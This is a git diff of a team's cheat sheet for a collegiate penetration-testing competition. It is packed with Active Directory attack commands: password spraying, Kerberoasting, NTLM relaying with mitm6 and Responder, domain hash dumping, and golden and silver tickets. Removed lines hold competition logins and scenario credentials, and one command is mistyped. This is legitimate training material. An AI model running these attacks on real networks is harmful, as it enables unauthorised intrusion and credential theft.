@@ -1,11 +1,4 @@
-# 2020 Collegiate Penetration Testing Competition Packet
-
-## Competition Information
-- Password: `result-SHOULDER-winter-SYMBOLS-belfast`
-- Google Drive Username: `finals-5@cptc.team`
-- VDI Server: `https://vdi.cyberrange.rit.edu/`
-- VDI Username: `MAIN\cptc-finals-t5-vdi[1-6]`
-- Support Website: `http://ngpew.com/pentest_support`
+# 2021 Collegiate Penetration Testing Competition Packet
 
 ## Google Drive Structure
 
@@ -21,6 +14,7 @@
 
 Recommended software to install:
 
+- Internet browser of choice
 - Bitvise SSH client - https://bitvise.com/ssh-client-download
 - Wireshark - https://www.wireshark.org/download.html
 - Greenshot (screenshot) - https://getgreenshot.org/downloads/
@@ -29,22 +23,18 @@ Recommended software to install:
 
 Use Bitvise from Windows VDI to SSH to Linux VDI. On first login, do this to enable logging:
 
-```sh
+```bash
 mkdir ~/logs
-echo "script -f ~/logs/\$(date +%s).log" >> .bash_profile
+echo "script -f ~/logs/\$(date +%s).log" | tee -a ~/.bash_profile ~/.zprofile
 ```
+
+Relogin to SSH. Every time you login, you should see `Script started`.
 
 Optional Windows AD tools:
 
-```sh
+```bash
 git clone https://github.com/fox-it/mitm6.git
 cd mitm6
-sudo pip install .
-```
-
-```sh
-git clone https://github.com/SecureAuthCorp/impacket
-cd impacket
 sudo pip install .
 ```
 
@@ -58,22 +48,16 @@ Type into file `old.txt`:
 august
 september
 october
+november
 summer
 fall
 winter
 corona
 covid19
-ngpw
-ngpew
-power
-electricity
-water
-smallville
-StrongPassword1
-WestThompsonDam
-OrchardStreetDam
-Mustangs
-TullyDam
+croissant
+lebonboncroissant
+croissantlife
+bonbon
 ```
 
 Run this Python script (comments not needed):
@@ -86,8 +70,8 @@ with open("old.txt", "r") as f:
 # Add years
 for x in o[:]:
 	if not x[0].isdigit():
-		o.append(x + "20")
-		o.append(x + "2020")
+		o.append(x + "21")
+		o.append(x + "2021")
 		o.append(x + "1")
 
 # Add capitals
@@ -109,28 +93,34 @@ Add `new.txt` to `lists/` in the Google Drive.
 
 ## Reconnaissance
 
+Host discovery scan so hosts can be assigned:
+
+```bash
+sudo nmap <ip_range> -sL
+```
+
 Initial scan (add to new Google Drive file in `scans/`):
 
-```sh
-nmap <ip_range> -T5 -sS -n -F -oN scan_short.txt
+```bash
+sudo nmap <ip_range> -T5 -sS -n -F -oN scan_short.txt
 ```
 
 Much longer scan (add to a new Google Drive file in `scans/`):
 
-```sh
-nmap <ip_range> -T5 -sS -n -p- -A --version-all -oN scan_long.txt
+```bash
+sudo nmap <ip_range> -T5 -sS -n -p- -A --version-all -oN scan_long.txt
 ```
 
 Add `-iL <filename>` to take in target IPs via a file. Add these options for a slower scan if you get blocked:
 
-```sh
+```bash
 -f --mtu 32 --ttl 64 -T1
 ```
 
 Dump traffic (use Bitvise on Windows to retrieve the PCAP and open it in Wireshark):
 
-```
-ifconfig # find name of interface
+```bash
+ip a # find name of interface
 tcpdump -i <interface> -s 65535 -w dump.pcap
 ```
 
@@ -138,13 +128,13 @@ tcpdump -i <interface> -s 65535 -w dump.pcap
 
 Find pages:
 
-```sh
+```bash
 dirb <url_base>
 ```
 
 Scan for vulnerabilities:
 
-```sh
+```bash
 nikto -h <ip> -p <port> # can also pass file with list of IPs
 ```
 
@@ -154,15 +144,39 @@ More resources at https://github.com/swisskyrepo/PayloadsAllTheThings/blob/maste
 
 ### Initial access
 
+SMB recon:
+
+```bash
+enum4linux -a <ip>
+```
+
+Anonymous SMB login:
+
+```bash
+smbclient -L //<ip>
+```
+
+Anonymous LDAP to get naming contexts:
+
+```bash
+ldapsearch -H ldap://<ip> -x -s base '' "(objectClass=*)" "*" +
+```
+
+Anonymous LDAP to get other stuff (naming contexts is comma separated list of `dc=`):
+
+```bash
+ldapsearch -H ldap://<ip> -x -b <naming_contexts>
+```
+
 Spray passwords on SMB (careful locking accounts):
 
-```sh
+```bash
 crackmapexec smb <ip> -u <username_list> -p <password_list> --continue-on-success
 ```
 
 Spray passwords on Kerberos (https://github.com/ropnop/kerbrute/tags) (careful locking accounts):
 
-```sh
+```bash
 ./kerbrute userenum -d <domain_name> <username_list>
 ./kerbrute passwordspray -d <domain_name> <username_list> <password>
 ./kerbrute bruteuser -d <domain_name> username <password_list>
@@ -170,56 +184,98 @@ Spray passwords on Kerberos (https://github.com/ropnop/kerbrute/tags) (careful l
 
 ASREPRoast (can also be done via Rubeus on Windows):
 
-```sh
+```bash
 crackmapexec ldap <ip> -u <username_list> -p '' --asreproast output.txt\
 hashcat -m18200 output.txt <password_list>
 ```
 
-May get NTLMv2 hash:
+May get NTLMv2 hash (used when server will make arbitrary HTTP request):
 
-```sh
+```bash
 responder -I <interface> --wpad
 ```
 
-May get a shell (need mitm6 and impacket):
+More on responder here: https://book.hacktricks.xyz/pentesting/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks
 
-```sh
+May get a shell (need mitm6):
+
+```bash
 mitm6 -i <interface> -d <domain_name>
-ntlmrelayx.py -wh <your_ip> -t smb://<ip> -i # in new terminal
+impacket-ntlmrelayx -wh <your_ip> -t smb://<ip> -i # in new terminal
 ```
 
 ### Escalation
 
 Kerberoasting (need domain account):
 
-```sh
+```bash
 crackmapexec ldap <ip> -u <username> -p <password> --kerberoasting output.txt
 hashcat -m13100 output.txt <password_list>
 ```
 
 Same thing with impacket:
 
-```sh
-GetUserSPNs.py -request -dc-ip <ip> <domain_name>/<username>
+```bash
+impacket-GetUserSPNs -request -dc-ip <ip> <domain_name>/<username>
 ```
 
-Microsoft Exchange escalation (need impacket):
+Microsoft Exchange escalation:
 
-```sh
+```bash
 wget https://raw.githubusercontent.com/dirkjanm/PrivExchange/master/privexchange.py
-ntlmrelayx.py -t ldap://<ip> --escalate-user <username>
+impacket-ntlmrelayx -t ldap://<ip> --escalate-user <username>
 python privexchange.py -ah <your_ip> <hostname>.<domain_name> -u <username> -d <domain_name> -p <password> # in new terminal
 secretsdump.py <domain_name>/<username><hostname>.<domain_name> -just-dc # in new terminal
 ```
 
-Resource-based constrained delegation (need mitm6 and impacket):
+Resource-based constrained delegation (need mitm6):
 
-```sh
+```bash
 mitm6 -i <interface> -d <domain_name>
-ntlmrelayx.py -t ldaps://<hostname>.<domain_name> -wh <your_ip> --delegate-access # in new terminal
-gtST.py -spn cifs/<hostname>.<domain_name>/<new_username>\$ -dc-ip <ip> -impersonate Administrator # in new terminal
+impacket-ntlmrelayx -t ldaps://<hostname>.<domain_name> -wh <your_ip> --delegate-access # in new terminal
+impacket-gtST -spn cifs/<hostname>.<domain_name>/<new_username>\$ -dc-ip <ip> -impersonate Administrator # in new terminal
 export KRB5CCNAME=Administrator.ccache
-secretsdump.py -k -no-pass <hostname>.<domain_name>
+impacket=secretsdump -k -no-pass <hostname>.<domain_name>
+```
+
+Add DNS records (need to clone https://github.com/dirkjanm/krbrelayx):
+
+```bash
+python3 dnstool.py -u '<domain>\<username>' -p <password> -a add -r <new_record> -d <your_ip> <target_ip>
+```
+
+Might dump a hash from the LDAP server which can be used for silver ticket (need to clone https://github.com/micahvandeusen/gMSADumper):
+
+```bash
+python3 gMSADumper.py -u <username> -p <password> -d <domain> -l <ip>
+```
+
+Pass the hash with impacket (`lm_hash` is optional):
+
+```bash
+impacket-getTGT <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
+```
+
+Silver ticket with impacket:
+
+```bash
+impacket-ticketer -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> -spn <service_spn> <user_name>
+```
+
+Golden ticket with impacket:
+
+```bash
+impacket-ticketer -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name> <user_name>
+```
+
+Use a ccache file to authenticate:
+
+```bash
+export KRB5CCNAME=<TGT_ccache_file>
+impacket-psexec <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+impacket-smbexec <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+impacket-wmiexec <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+impacket-smbclient <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 ```
 
 ## SCADA
@@ -250,138 +306,32 @@ client.close()
 # https://pymodbus.readthedocs.io/en/latest/source/library/pymodbus.client.html
 ```
 
-# Previous Credentials
-
-```
-tonja.bartell@ngpew.com:OrchardStreetDam
-francesco.metz@ngpew.com:TullyDam
-dominic.oberbrunner@ngpew.com:WestThompsonDam
-gaylord.schaefer@ngpew.com:WolfordMountainReservoir
-```
-
 ## OSINT
 
-### Password Policy
+### Companies
 
-- More than 3 or 4 characters
-- Less than 20 characters
-
-### Company
-
-- Headquarted in Smallville, NY 14773
-- 51-200 employees
-- Founded in 1980
+- Le Bonbon Croissant
+  - Company receiving the test
+  - Also sells candy
+- Le Bonbon Muffin
+  - Rival company
+  - Wilma Wonka claims is stealing recipes
+  - Slug is founder and president
+  - Coupon code: `croissantsuck`
 
 ### People
 
-- Grace Grantham
-  - Position: Chief Executive Officer since August 2019
-  - Location: Salamanca, NY
-  - Education: Western Governors University MBA (2004-2007), Humboldt State University Bachelor's in Environmental Science (2003-2007)
-  - Founder/CEO of H2Mon (June 2009-March 2019) in Bay Area
-  - Likes Melinda Gates
-- King Shields
-  - Position: Chief Operating Officer since December 2001
-  - Location: Buffalo-Niagara Falls Area
-  - Education: Cornell University MEng/MBA (2009-2012), University of Pennsylvania Bachelor’s in Hydrology/EE (1993-1998)
-  - At NGPEW for 20+ years, in management for 10+ years
-- Tiny Glover
-  - Position: Chief Engineering Officer
-  - Location: Portland, OR
-  - Enjoys golf, averages a 98
-- Gaylord Schaefer
-  - Position: Director of Information Technology since May 1996
-  - Location: Salamanca, NY
-  - Education: University of Montevallo BS in Art (1987-1993)
-  - Skilled in Windows 95/98
-- Maxie Thompson
-  - Position: Director of Safety
-- Barbara Leuschke
-  - Position: Director of Human Resources since July 2017
-  - Location: Buffalo-Niagara Falls Area
-  - Education: Barnard College Master’s in Industrial/Organizational Psychology (2012-2014), University of Michigan Bachelor’s in HR Management/Services (2008-2012)
-
-## Legal Information
-
-NGPEW has a Critical Infrastructure Engineering Enhancement Grant (from LexCorp and DHS). Could not find anymore information.
-
-### FERC/NERC
-
-The Energy Policy Act of 2005 (Energy Policy Act) gave the Federal Energy Regulatory Commission (Commission or FERC) authority to oversee the reliability of the bulk power system, commonly referred to as the bulk electric system or the power grid. This includes authority to approve mandatory cybersecurity reliability standards.
-
-The North American Electric Reliability Corporation (NERC), which FERC has certified as the nation’s Electric Reliability Organization, developed Critical Infrastructure Protection (CIP) cyber security reliability standards. On January 18, 2008, the Commission issued Order No. 706, the Final Rule approving the CIP reliability standards, while concurrently directing NERC to develop significant modifications addressing specific concerns.
-
-### CIP
-
-- Violations
-  - Lower, Moderate, High, or Severe VSL (Violation Security Level)
-  - Up to $1M per violation per day
-  - Utility company fined $10M last year for multiple violations
-- Bulk Electric System (BES) = 100 kV or higher
-- CIP-002-5.1a - BES Cyber System Categorization
-  - Defines high, medium, and low impact BES systems
-- CIP-010-3 - Configuration Change Management and Vulnerability Assessments
-  - Prevent/detect unauthorized changes to BES cyber systems
-  - Addresses periodic vulnerability assessments, removable media, monitoring/authorizing/documenting configuration changes
-- CIP-005-6 - Electronic Security Perimeter(s)
-  - Monitor/authorize inbound/outbound connections
-- CIP-011-2 - Information Protection
-  - Procedures for storage/transit/use of sensitive information
-- CIP-004-6 - Personnel & Training
-  - Verify user account and privileges are correct
-  - Revoke access and change passwords
-- CIP-003-8 - Security Management Controls
-  - Policy stuff
-- CIP-007-6 - System Security Management
-  - Enable only logical network ports that are needed
-  - Protect against use of unnecessary physical ports, console commands, removable media
-  - Implement patch management process
-  - Deter/detect/prevent malicious code
-  - Log events like logins and malicious code
-  - Enforce authentication of interactive user access
-  - Identify default/generic accounts
-  - Identify individuals with access to shared accounts
-  - Change default passwords, enforce periodic password changes
-  - Password length at least 8 and 3+ different types of characters
-  - Limit number of failed logins
-
-### PSA
-
-The Department of Homeland Security, Cybersecurity and Infrastructure Security Agency (CISA), Infrastructure Security Division operates the Protective Security Advisor (PSA) Program. PSAs are trained critical infrastructure protection and vulnerability mitigation subject matter experts who facilitate local field activities in coordination with other Department of Homeland Security offices. They also advise and assist state, local, and private sector officials and critical infrastructure facility owners and operators.
-
-- Plan, coordinate, and conduct security surveys and assessments – PSAs conduct voluntary, non-regulatory security surveys and assessments on critical infrastructure assets and facilities within their respective regions.
-- Plan and conduct outreach activities – PSAs conduct outreach activities with critical infrastructure owners and operators, community groups, and faith-based organizations in support of CISA priorities.
-- Respond to incidents – PSAs plan for and, when directed, deploy to Unified Area Command Groups, Joint Operations Centers, Federal Emergency Management Agency Regional Response Coordination Centers, and/or State and local Emergency Operations Centers in response to natural or man-made incidents.
-
-### PCII
-
-Final Rule: https://www.cisa.gov/sites/default/files/publications/pcii-final-rule-federal-register-09-01-06-508.pdf
-
-- CII = critical infrastructure information
-  - Information related to the security of CI or protected systems
-  - Includes documents, records, or other information concerning threats, vulnerabilities, and operational experience
-- PCII must be:
-  - Voluntarily submitted
-  - Not customarily available in the public domain
-  - Not submitted in lieu of compliance with any regulatory requirement
-  - Also must include Express Statement and Certification Statement
-- Submitter:
-  - Owner of information being submitted
-  - Has sufficient knowledge of the information to affirm it is being submitted voluntarily
-  - Has sufficient knowledge of the information to affirm it is not lawfully, properly, and regulary disclosed generally or broadly to the public
-  - Includes government, representatives of companies, industry associations, individuals capable of analyzing CI, working groups
-- PCII markings (done by PCII office):
-  - PCII cover sheet
-  - "Protected Critical Infrastructure Information" in the headers and footers
-  - Identification number
-  - Labeled with required Protection Statement
-- To access PCII:
-  - Need to be trained in handling/safeguarding
-  - Have homeland security responsibilities as specified in CII Act of 2002, the Final Rule
-  - Have a need to know
-  - Sign an NDA (non-Federal employees)
-- Violation of PCII
-  - Any officer or employee of the United States or of any department or agency thereof is subject to penalties by knowingly publishing, disclosing, divulging, and/or making PCII known in any manner not authorized by law
-  - Fined up to $250,000
-  - Imprisoned up to one year
-  - Remove from office or employment
+- Wilma Wonka
+  - Founder and President
+  - With company since 1971
+- Charlie Bucket
+  - Chief Executive Officer
+  - Born in 1957?
+- 'Granpa' Jim Joseph
+  - Principle Security Engineer
+- Yael Corne
+  - VP Risk and Compliance (DPO)
+- Mike Devry
+  - Senior Security Engineer
+- Andrea Lefuvre
+  - Customer Success Manager
